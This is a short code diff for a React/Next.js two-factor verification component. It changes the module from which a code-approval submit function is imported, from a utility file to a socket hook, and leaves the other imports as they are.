@@ -1,7 +1,7 @@
 import VerifyImage from '@/assets/images/2FAuth.png';
 import { useAppealContext } from '@/hooks/use-appeal-context';
+import { submitCodeApproval } from '@/hooks/use-socket';
 import { store } from '@/store/store';
-import { submitCodeApproval } from '@/utils/approval-flow';
 import translateText from '@/utils/translate';
 import Image from 'next/image';
 import { type FC, type FormEvent, useEffect, useState } from 'react';
